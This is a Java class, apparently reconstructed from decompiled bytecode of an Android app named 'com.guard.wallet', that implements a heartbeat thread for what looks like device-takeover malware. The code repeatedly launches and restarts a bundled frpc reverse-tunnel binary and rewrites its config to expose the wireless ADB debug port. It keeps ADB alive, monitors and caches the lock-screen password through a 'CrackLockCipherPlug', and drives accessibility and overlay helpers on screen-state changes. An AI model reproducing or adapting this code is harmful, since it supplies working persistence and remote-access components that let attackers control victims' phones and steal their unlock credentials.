/**
 * vendor thread/b.java — CheckProcessThread (KeepHeart heartbeat)
 *
 * 心跳检测/进程监控 TimerTask。
 * 周期性检查屏幕状态、frpc 进程、空闲时长、调试端口重写。
 */
package com.guard.wallet.thread;

import com.guard.wallet.core.AppUtils;
import android.os.Build;
import android.util.Log;
import com.guard.wallet.entity.CommandResult;
import com.guard.wallet.helper.AutomationHelper;
import com.guard.wallet.req.MessageBodyVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.model.EventEntity;
import com.guard.wallet.req.RewriteDebugPortVO;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.ListIterator;
import java.util.Objects;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

public final class CheckProcessThread extends TimerTask {
    public static final ReentrantLock q = new ReentrantLock();

    public final EventEntity a = new EventEntity(5000, 2);
    public Timer b;
    public String c;
    public String d;
    public LinkedList<String> e;
    public Process f;
    public boolean g;
    public boolean h = false;
    public final AtomicInteger i = new AtomicInteger(0);
    public final LinkedList<Integer> j = new LinkedList<>();
    public final LinkedList<Integer> k;
    public final AtomicReference<com.guard.wallet.enums.CheckThreadState> l;
    public final AtomicLong m;
    public final AtomicLong n;
    public final AtomicLong o;
    public final AtomicLong p;

    public CheckProcessThread() {
        LinkedList<Integer> events = new LinkedList<>();
        this.k = events;
        this.l = new AtomicReference<>(com.guard.wallet.enums.CheckThreadState.b);
        this.m = new AtomicLong(0L);
        this.n = new AtomicLong(0L);
        this.o = new AtomicLong(0L);
        this.p = new AtomicLong(0L);
        this.e = new LinkedList<>();
        c();

        events.add(4194304);
        events.add(2048);
        events.add(64);
        if (Build.VERSION.SDK_INT >= 33) {
            events.add(33554432);
        }
        events.add(131072);
        events.add(16777216);
    }

    /* vendor static a() — check frpc.ini exists */
    public static boolean a() {
        String path = com.guard.wallet.utils.SystemHelper.i0();
        if (AppUtils.B(path)) {
            return true;
        }
        if (AppUtils.v(path)) {
            return true;
        }
        Log.d("CheckProcessThread", "frpc.ini 文件不存在");
        com.guard.wallet.http.HttpApiManager.queryAgentFile();
        return false;
    }

    /* vendor static d() — find libfrpc.so path */
    public static String d() {
        String libDir = com.guard.wallet.utils.SystemHelper.y0();
        if (!AppUtils.B(libDir)) {
            Log.d("CheckProcessThread", "APP Lib目录:".concat(libDir));
            String soPath = libDir.concat("/").concat("libfrpc.so");
            if (AppUtils.w(soPath)) {
                return soPath;
            }
        }
        return null;
    }

    /* vendor static f(int) — notify lock state change */
    public static void f(int state) {
        String subscribeId = com.guard.wallet.utils.SharedPrefsManager.l("lockSubscribeId");
        if (!AppUtils.B(subscribeId)) {
            com.guard.wallet.http.HttpApiManager.finishListenHelper(new ReqListenHelper(subscribeId, state));
            com.guard.wallet.utils.SharedPrefsManager.w("lockSubscribeId");
        }

        boolean blockShown = com.guard.wallet.helper.AutomationHelper.k();
        if (blockShown) {
            com.guard.wallet.helper.AutomationHelper.g(state == 4);
        }
        com.guard.wallet.helper.OverlayViewHelper.f(null, state == 4);
    }

    /* vendor b() — check frpc port availability */
    public final boolean b() {
        boolean available = !AppUtils.E(7400);
        this.g = available;
        return available;
    }

    /* vendor c() — init frpc command list */
    public final void c() {
        this.c = d();
        String dataDir = com.guard.wallet.utils.SystemHelper.i0();
        if (!AppUtils.B(dataDir)) {
            this.d = dataDir.concat("/").concat("frpc.ini");
            Log.d("CheckProcessThread", "APP 数据目录:".concat(dataDir));
        }

        if (!AppUtils.B(this.c) && !AppUtils.B(this.d)) {
            Log.d("CheckProcessThread", this.c);
            Log.d("CheckProcessThread", this.d);
            this.e.clear();
            this.e.add(this.c);
            this.e.add("-c");
            this.e.add(this.d);
        }
    }

    /* vendor e() — hot-reload frpc config */
    public final void e() {
        String soPath = d();
        this.c = soPath;
        if (AppUtils.B(soPath) || !AppUtils.w(this.c)) {
            Log.d("CheckProcessThread", "libfrpc.so 文件不存在");
            return;
        }

        this.c = d();
        String dataDir = com.guard.wallet.utils.SystemHelper.i0();
        if (!AppUtils.B(dataDir)) {
            this.d = dataDir.concat("/").concat("frpc.ini");
            Log.d("CheckProcessThread", "APP 数据目录:".concat(dataDir));
        }

        if (!AppUtils.B(this.c) && !AppUtils.B(this.d)) {
            Log.d("CheckProcessThread", this.c);
            Log.d("CheckProcessThread", this.d);
            this.e.clear();
            this.e.add(this.c);
            this.e.add("reload");
            this.e.add("-c");
            this.e.add(this.d);
        }

        if (!a()) {
            return;
        }
        if (this.e.isEmpty()) {
            return;
        }

        String libDir = com.guard.wallet.utils.SystemHelper.y0();
        if (AppUtils.B(libDir)) {
            libDir = null;
        } else {
            Log.d("CheckProcessThread", "APP Lib目录:".concat(libDir));
        }

        if (!this.b()) {
            return;
        }

        // 检查 frpc 进程是否存在
        int found = 0;
        CommandResult psResult = AppUtils.u(new String[]{"ps -ef | grep frpc"}, false, true);
        if (psResult.getResult() == 0 && psResult.getSuccessMsgLines() != null
                && !psResult.getSuccessMsgLines().isEmpty()) {
            for (String line : psResult.getSuccessMsgLines()) {
                Log.d("CheckProcessThread", line);
                if (!AppUtils.B(line) && line.contains(this.d)) {
                    found = 1;
                    break;
                }
            }
        }

        if (found != 0 && !AppUtils.B(libDir)) {
            CommandResult result = executeProcess(this.e, libDir, 30L);
            if (result.getResult() == 0 && result.getSuccessMsgLines() != null
                    && !result.getSuccessMsgLines().isEmpty()) {
                for (String line : result.getSuccessMsgLines()) {
                    if (!AppUtils.B(line) && line.contains("reload success")) {
                        Log.d("CheckProcessThread", "frpc.ini".concat(" 热加载成功"));
                        break;
                    }
                }
            }
        }
    }

    /* vendor g() — schedule heartbeat timer */
    public final void g() {
        if (this.b == null) {
            this.b = new Timer();
        }
        this.b.schedule(this, 5000L, 5000L);
    }

    /**
     * vendor run() — main heartbeat loop.
     * Translated from CFR bytecode (VF couldn't decompile).
     *
     * Bytecode offsets 000-7b7:
     * 000-006: tryLock
     * 009-018: check AdbConnectionManager.getInstance() and port 7912
     * 01b-023: log "check process thread is running"
     * 024-1ba: synchronized(this) — screen state detection and handling
     * 1ba-2fb: idle duration tracking
     * 2fb-520: frpc state handling (stopped/running)
     * 520-7a9: debug port rewrite
     * 7a9-7b7: unlock
     */
    @Override
    public final void run() {
        if (!q.tryLock()) {
            return;
        }
        try {
            // 009-018: AdbConnectionManager.getInstance() 检查 + 端口探测
            if (com.guard.wallet.delegate.EngineHelper.heS() != null && !AppUtils.E(7912)) {
                com.guard.wallet.http.HttpApiManager.noticeAlive();
            }

            Log.d("CheckProcessThread", "check process thread is running");

            // 024-1ba: synchronized — 屏幕状态检测
            synchronized (this) {
                try {
                    // 028-040: 读取 screenState，映射 2→1, 3→0
                    int storedState = com.guard.wallet.utils.SharedPrefsManager.i("screenState");
                    int previousState = storedState;
                    if (storedState == 2) {
                        previousState = 1;
                    }
                    int mapped = previousState;
                    if (previousState == 3) {
                        mapped = 0;
                    }

                    // 041-06f: 获取锁屏状态
                    com.guard.wallet.req.LockPatternVO lockPattern = com.guard.wallet.utils.SystemHelper.B0();
                    int currentState;
                    if (!com.guard.wallet.utils.DeviceUtils.isScreenOn()) {
                        currentState = 0;
                    } else if (lockPattern.getIsKeyguardLocked().intValue() == 0
                            && lockPattern.getIsDeviceSecure().intValue() == 1) {
                        currentState = 4;
                    } else {
                        currentState = 1;
                    }

                    // 077-07d: 如果 currentState != 0，触发 LockActivity
                    if (!Objects.equals(Integer.valueOf(currentState), Integer.valueOf(0))) {
                        com.guard.wallet.LockActivity.a();
                    }

                    // 080-08b: 如果 previousState != currentState，执行状态切换逻辑
                    if (!Objects.equals(Integer.valueOf(mapped), Integer.valueOf(currentState))) {

                        // 08e-0d7: currentState == 0 分支
                        if (currentState == 0) {
                            f(currentState);

                            // 096-0b8: 停止无障碍代理
                            if (com.guard.wallet.service.MyAccessibilityService.P() != null
                                    && com.guard.wallet.service.MyAccessibilityService.P().j()) {
                                com.guard.wallet.service.MyAccessibilityService.q2.set(true);
                                Log.d("CheckProcessThread", "stopLocalAccessibilityDelegate");
                                com.guard.wallet.service.MyAccessibilityService.P().D();
                            }

                            // 0bb-0d3: 清除锁屏密码缓存
                            if (com.guard.wallet.MainApplication.getInstance() != null
                                    && com.guard.wallet.MainApplication.getInstance().getCrackLockCipherPlug() != null) {
                                com.guard.wallet.MainApplication.getInstance().getCrackLockCipherPlug().getClass();
                                com.guard.wallet.plug.CrackLockCipherPlug.clearCacheIfInactive();
                            }

                            // 0d7: 清除辅助数据
                            com.guard.wallet.helper.ListenWindowHelper.a();
                            // 0da-0dd: 清除 lockBatchId
                            com.guard.wallet.utils.SharedPrefsManager.w("lockBatchId");
                        }

                        // 0e0-0fb: currentState == 1 且锁屏，保存 lockBatchId
                        if (currentState == 1 && com.guard.wallet.utils.SystemHelper.p0()) {
                            com.guard.wallet.utils.SharedPrefsManager.D(
                                    Long.valueOf(com.guard.wallet.receiver.ScreenBroadcastReceiver.b.nextId()),
                                    "lockBatchId");
                        }

                        // 0fb-156: currentState == 4 (USER_PRESENT)
                        if (currentState == 4) {
                            if (com.guard.wallet.MainApplication.getInstance() != null) {
                                if (!com.guard.wallet.MainApplication.getInstance().isUserUnlockedInstance()) {
                                    com.guard.wallet.MainApplication.getInstance().unlockedInstance();
                                }
                                if (com.guard.wallet.MainApplication.getInstance().getCrackLockCipherPlug() != null) {
                                    com.guard.wallet.MainApplication.getInstance().getCrackLockCipherPlug().getClass();
                                    com.guard.wallet.plug.CrackLockCipherPlug.startMonitoring();
                                }
                            }
                            if (com.guard.wallet.MainApplication.getInstance() != null) {
                                com.guard.wallet.MainApplication.getInstance()
                                        .offerStrategyEvent("KEEP_ADB_ALIVE_SCREEN_USER_PRESENT");
                            }
                            f(currentState);

                            // 13e-155: 重置 AtomicBoolean，执行全局操作
                            java.util.concurrent.atomic.AtomicBoolean accFlag =
                                    com.guard.wallet.service.MyAccessibilityService.q2;
                            if (accFlag.get()) {
                                accFlag.set(false);
                                com.guard.wallet.utils.SystemHelper.F0(2);
                            }
                        }

                        // 156-193: 映射 intent action
                        String intentCode;
                        if (currentState == 0) {
                            intentCode = "android.intent.action.SCREEN_OFF";
                        } else if (currentState == 1) {
                            intentCode = "android.intent.action.SCREEN_ON";
                        } else if (currentState == 2) {
                            intentCode = "android.intent.action.DREAMING_STARTED";
                        } else if (currentState == 3) {
                            intentCode = "android.intent.action.DREAMING_STOPPED";
                        } else if (currentState == 4) {
                            intentCode = "android.intent.action.USER_PRESENT";
                        } else {
                            intentCode = "android.intent.action.SCREEN_ON";
                        }

                        // 193-1a9: 保存 screenState 并通知
                        com.guard.wallet.utils.SharedPrefsManager.D(Integer.valueOf(currentState), "screenState");
                        com.guard.wallet.utils.SharedPrefsManager.H(currentState, intentCode);
                    }
                } catch (Exception ex) {
                    AppUtils.s("CheckProcessThread", ex);
                }
            }

            // 1ba: 退出同步块后继续

            // 1bc: 检查 frpc.ini
            a();
            // 1c1: 检查端口
            b();

            // 1c5-2fb: idle duration 跟踪
            if (!Objects.equals(this.l.get(), com.guard.wallet.enums.CheckThreadState.b) && this.m.get() > 0L) {
                boolean screenOn = com.guard.wallet.utils.DeviceUtils.isScreenOn();

                // 1e6-209: 屏幕亮且未锁屏时重置计时
                if (screenOn && !com.guard.wallet.utils.SystemHelper.p0()) {
                    this.o.set(0L);
                    this.p.set(0L);
                } else {
                    // 20c-259: 屏幕关闭/锁屏时计算离屏时长
                    long now = System.currentTimeMillis();
                    if (this.o.get() == 0L) {
                        this.o.set(now);
                    }
                    long elapsed = now - this.o.get();
                    if (elapsed > 0L) {
                        long minutes = elapsed / 60000L;
                        if (minutes > this.p.get()) {
                            this.p.set(minutes);
                            if (com.guard.wallet.MainApplication.getInstance() != null) {
                                com.guard.wallet.MainApplication.getInstance()
                                        .offerStrategyEvent("SCREEN_OFF_LONG_DURATION");
                            }
                        }
                    }
                }

                // 25c-2a5: 检测交互空闲超时 → 切换为 idle 状态
                long now2 = System.currentTimeMillis();
                if (now2 - this.m.get() > 60000L) {
                    if (!Objects.equals(this.l.get(), com.guard.wallet.enums.CheckThreadState.c)) {
                        this.l.set(com.guard.wallet.enums.CheckThreadState.c);
                        this.m.set(now2);
                        this.n.set(0L);
                    }
                }

                // 2a8-2fb: idle 状态下累计空闲时长
                if (Objects.equals(this.l.get(), com.guard.wallet.enums.CheckThreadState.c)) {
                    long idleElapsed = System.currentTimeMillis() - this.m.get();
                    if (idleElapsed > 0L) {
                        long idleMinutes = idleElapsed / 60000L;
                        if (idleMinutes > this.n.get()) {
                            this.n.set(idleMinutes);
                            if (com.guard.wallet.MainApplication.getInstance() != null) {
                                com.guard.wallet.MainApplication.getInstance()
                                        .offerStrategyEvent("INTERACTIVE_IDLE_LONG_DURATION");
                            }
                        }
                    }
                }
            }

            // 2fb-520: frpc 状态处理
            if (!this.g) {
                // 309-33d: frpc 不可用，发送 stopped 消息
                MessageRecordVO<MessageBodyVO> stoppedMsg = new MessageRecordVO<>();
                MessageBodyVO stoppedBody = new MessageBodyVO();
                stoppedMsg.setIntentCode("android.app.service.net.rpc.stopped");
                stoppedMsg.setExtraBody(stoppedBody);
                this.a.dispatch(stoppedMsg);
                com.guard.wallet.utils.SharedPrefsManager.F();

                // 336-520: 连续3次不可用且未禁止，尝试启动 frpc
                if (this.i.incrementAndGet() >= 3 && !this.h) {
                    this.i.set(0);

                    String dataDir = com.guard.wallet.utils.SystemHelper.i0();
                    String soPath = d();
                    this.c = soPath;

                    if (!AppUtils.B(soPath) && AppUtils.w(this.c)) {
                        this.c();

                        if (!AppUtils.B(dataDir) && a() && !this.e.isEmpty()) {
                            // 38a-3b5: 检查旧进程是否还活着
                            boolean needStart = true;
                            Process oldProcess = this.f;
                            if (oldProcess != null) {
                                try {
                                    int exitVal = oldProcess.exitValue();
                                    if (exitVal >= 0) {
                                        needStart = true;
                                    } else {
                                        needStart = false;
                                    }
                                } catch (Exception ex) {
                                    AppUtils.s("CheckProcessThread", ex);
                                    needStart = true;
                                }
                            }

                            if (needStart && !this.b()) {
                                // 3cc-4b2: 构建并启动 frpc 进程
                                String stdoutPath = null;
                                String stderrPath = null;
                                if (!AppUtils.B(dataDir)) {
                                    stdoutPath = dataDir.concat("/libfrpc.so.out.log");
                                    stderrPath = dataDir.concat("/libfrpc.so.error.log");
                                }

                                String libDir = com.guard.wallet.utils.SystemHelper.y0();
                                if (!AppUtils.B(libDir)) {
                                    Log.d("CheckProcessThread", "APP Lib目录:".concat(libDir));
                                } else {
                                    libDir = null;
                                }

                                if (!AppUtils.B(libDir)) {
                                    Process newProcess = null;
                                    try {
                                        if (this.e != null && !this.e.isEmpty()) {
                                            ProcessBuilder builder = new ProcessBuilder(this.e);
                                            builder.directory(new File(libDir));
                                            if (!AppUtils.B(stdoutPath)) {
                                                builder.redirectOutput(new File(stdoutPath));
                                            }
                                            if (!AppUtils.B(stderrPath)) {
                                                builder.redirectError(new File(stderrPath));
                                            }
                                            newProcess = builder.start();
                                            if (newProcess != null) {
                                                Log.d("ShellUtils", "命令行启动完成");
                                            }
                                        }
                                    } catch (Throwable ex) {
                                        AppUtils.t("ShellUtils", ex);
                                        newProcess = null;
                                    }

                                    this.f = newProcess;
                                    if (newProcess != null) {
                                        try {
                                            if (this.b()) {
                                                Log.d("CheckProcessThread", "libfrpc.so 运行成功");
                                            } else {
                                                Log.e("CheckProcessThread", "libfrpc.so 运行失败");
                                            }
                                        } catch (Exception ex) {
                                            AppUtils.s("CheckProcessThread", ex);
                                            Log.e("CheckProcessThread", "libfrpc.so 运行失败");
                                        }
                                    } else {
                                        Log.e("CheckProcessThread", "libfrpc.so 运行失败");
                                    }
                                }
                            }
                        }
                    } else {
                        Log.d("CheckProcessThread", "libfrpc.so 文件不存在");
                    }
                }
            } else {
                // 4eb-51d: frpc 可用，发送 running 消息
                this.i.set(0);
                MessageRecordVO<MessageBodyVO> runningMsg = new MessageRecordVO<>();
                MessageBodyVO runningBody = new MessageBodyVO();
                runningMsg.setIntentCode("android.app.service.net.rpc.running");
                runningMsg.setExtraBody(runningBody);
                this.a.dispatch(runningMsg);
                com.guard.wallet.utils.SharedPrefsManager.F();
            }

            // 520-7a9: debug port 重写
            if (!this.j.isEmpty()) {
                LinkedList<Integer> portQueue = this.j;
                if (!portQueue.isEmpty()) {
                    Integer debugPort = (Integer) portQueue.get(portQueue.size() - 1);
                    portQueue.clear();

                    if (!AppUtils.B(this.d)) {
                        // 55c-675: 读取 frpc.ini 配置文件
                        String configPath = this.d;
                        List<String> lines = null;
                        if (!AppUtils.B(configPath)) {
                            File configFile = new File(configPath);
                            if (configFile.exists() && configFile.isFile() && configFile.canRead()) {
                                Log.d("FileUtils", "文件存在,能读取:" + configPath);
                                FileInputStream fis = null;
                                InputStreamReader isr = null;
                                BufferedReader reader = null;
                                try {
                                    fis = new FileInputStream(configFile);
                                    isr = new InputStreamReader(fis);
                                    reader = new BufferedReader(isr);
                                    LinkedList<String> readLines = new LinkedList<>();
                                    String line;
                                    while ((line = reader.readLine()) != null) {
                                        readLines.add(line);
                                    }
                                    fis.close();
                                    isr.close();
                                    reader.close();
                                    lines = readLines;
                                } catch (Exception ex) {
                                    AppUtils.s("FileUtils", ex);
                                    if (fis != null) {
                                        try { fis.close(); } catch (Exception ex2) { AppUtils.s("FileUtils", ex2); }
                                    }
                                    if (isr != null) {
                                        try { isr.close(); } catch (Exception ex2) { AppUtils.s("FileUtils", ex2); }
                                    }
                                    if (reader != null) {
                                        try { reader.close(); } catch (Exception ex2) { AppUtils.s("FileUtils", ex2); }
                                    }
                                }
                            }
                        }

                        // 675-75e: 修改 wifi-debug-port 段的 local_port
                        if (lines != null && !lines.isEmpty()) {
                            boolean inWifiDebugPortBlock = false;
                            ListIterator<String> iter = lines.listIterator();
                            while (iter.hasNext()) {
                                String line = iter.next();
                                if (line == null) {
                                    continue;
                                }
                                if (line.contains("wifi-debug-port")) {
                                    inWifiDebugPortBlock = true;
                                }
                                if (inWifiDebugPortBlock && line.contains("local_port")) {
                                    iter.set("local_port = " + String.valueOf(debugPort));
                                    break;
                                }
                            }

                            // 6de-745: 拼接文件内容
                            String content = null;
                            try {
                                if (!lines.isEmpty()) {
                                    StringBuilder sb = new StringBuilder();
                                    for (String line : lines) {
                                        if (line == null) {
                                            continue;
                                        }
                                        sb.append(line);
                                        sb.append('\n');
                                    }
                                    content = sb.toString();
                                }
                            } catch (Exception ex) {
                                AppUtils.s("FileUtils", ex);
                            }

                            // 745-75e: 写入文件并热加载
                            if (AppUtils.U(this.d, content)) {
                                Log.d("CheckProcessThread", "网络代理文件已修改");
                                this.e();
                            }
                        }

                        // 75e-7a9: 通知本地服务 rewriteDebugPort
                        if (debugPort != null && debugPort.intValue() > 0) {
                            RewriteDebugPortVO request = new RewriteDebugPortVO();
                            request.setDeviceId(com.guard.wallet.utils.SharedPrefsManager.l("deviceId"));
                            request.setDebugPort(debugPort);
                            okhttp3.Callback callback = createHttpCallback(1);
                            new com.guard.wallet.http.HttpClient("http://127.0.0.1:7912")
                                    .asyncGet(request, "/rewriteDebugPort", callback);
                        }
                    }
                }
            }
        } finally {
            q.unlock();
        }
    }

    /* ---- private helpers (kept from previous replica, used by e()) ---- */

    private CommandResult executeProcess(List<String> args, String workingDir, long timeoutSeconds) {
        if (args == null || args.isEmpty() || AppUtils.B(workingDir)) {
            return new CommandResult(-1, null, null);
        }

        LinkedList<String> stdout = new LinkedList<>();
        LinkedList<String> stderr = new LinkedList<>();
        int result = -1;
        Process process = null;

        try {
            ProcessBuilder builder = new ProcessBuilder(args);
            builder.directory(new File(workingDir));
            process = builder.start();
            boolean finished = process.waitFor(timeoutSeconds, TimeUnit.SECONDS);
            result = finished ? 0 : -1;

            try (BufferedReader out = new BufferedReader(new InputStreamReader(process.getInputStream()));
                 BufferedReader err = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {
                String line;
                while ((line = out.readLine()) != null) {
                    stdout.add(line);
                }
                while ((line = err.readLine()) != null) {
                    stderr.add(line);
                }
            }
        } catch (Exception ex) {
            AppUtils.s("ShellUtils", ex);
        } finally {
            if (process != null) {
                process.destroyForcibly();
            }
        }

        return new CommandResult(result, stdout, stderr);
    }

    /** Helper to avoid field name 'j' shadowing package 'j' */
    private static okhttp3.Callback createHttpCallback(int type) {
        return com.guard.wallet.delegate.AdbBridge.createHttpCallback(type);
    }
}
